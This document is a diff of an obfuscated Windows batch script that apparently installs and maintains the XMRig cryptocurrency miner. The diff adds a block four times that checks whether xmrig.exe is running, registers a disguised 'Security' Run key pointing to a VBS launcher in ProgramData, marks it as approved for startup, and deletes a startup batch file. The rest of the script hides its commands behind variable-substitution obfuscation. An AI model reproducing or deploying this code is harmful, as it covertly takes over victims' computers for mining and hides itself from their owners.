@@ -53,6 +53,11 @@ set bbbbbbbbbbbbbbbbbbbbbbbb=W
 set bbbbbbbbbbbbbbbbbbbbbbbbb=X
 set bbbbbbbbbbbbbbbbbbbbbbbbbb=Y
 set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa% “%bbbbbbbbbbbbbbbbbbbb%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% %bbbb%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%”
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaa% %aaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa%=%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aa%%aaa%%aaaaaaaaaaaaa%%aaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aa%%aaaaaaaaaaaaaaaaaaaaaaa%*
@@ -424,6 +429,11 @@ set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbb% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %bb%%bbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbb%%bbbbbbbbbbbbbbbbbbbbbb%%bb%%bbbbbbbbbbbbbbbbbbb%%bbbbb%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbb% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %bb%%bbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbb%%bbbb%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -1082,6 +1092,11 @@ set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -1566,6 +1581,11 @@ set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaa%%aa%%aaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%\%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% %aaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bb%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%bbbbbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%bbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aa%%aaa%%aaaaaaaaaaaaa%%aaaaaa%%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%\%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% %aaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bb%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%bbbbbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%bbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaa%%aaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%\%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% %aaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa%%bbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aa%%aaa%%aaaaaaaaaaaaa%%aaaaaa%%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
@@ -2052,7 +2072,7 @@ set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
 tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
 if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V Security /t REG_BINARY /D 000000000000000000000000 /F
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 goto start
 :execute
